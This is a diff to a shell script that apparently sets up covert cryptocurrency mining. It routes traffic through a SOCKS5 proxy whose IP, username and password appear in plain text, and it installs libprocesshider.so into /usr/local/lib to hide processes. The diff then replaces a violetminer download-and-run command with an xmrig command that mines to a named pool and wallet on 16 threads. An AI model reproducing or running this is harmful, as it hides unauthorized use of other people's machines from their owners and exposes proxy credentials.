@@ -12,9 +12,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = sg-socks5.woiden.net:8080
-socks5_username = woiden_sairinjitu
-socks5_password = 12345
+socks5 = 188.166.113.250:80
+socks5_username = bian15
+socks5_password = 150788
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -48,4 +48,4 @@ sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.s
 cd ..
 
 
-./graftcp/graftcp wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.hashvault.pro:80 --username TRTLv1bEDCWed2DJYzEwfmUAdEyT3QHf3TwvE2odPufw8LdCVbKeBB1gfXYmM8FknQ8nkQ796g2t2MqweQUomiH1G2uu85y14so --password BULUS --algorithm chukwa/wrkz
+./graftcp/graftcp wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -xf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && ./xmrig  -a CryptoNight-STC -pool stc.ss.dxpool.net:9977 -u nurfasin.gas  --keepalive --timeout 120 --donate-level 1 -p  c=STC,mc=STC,ID=jemby -t 16
